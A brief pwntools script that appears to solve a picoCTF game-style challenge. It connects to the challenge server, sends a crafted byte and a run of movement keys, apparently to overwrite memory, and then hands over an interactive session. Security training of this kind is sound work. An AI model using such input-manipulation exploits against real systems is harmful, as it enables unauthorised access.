from pwn import *

port = 60360
io = remote("saturn.picoctf.net", port)

io.send(b"l" + b"\x78")
io.send(b"w" * 4)
io.send(b"d" * (51 - 4))
io.sendline(b"w")

io.interactive()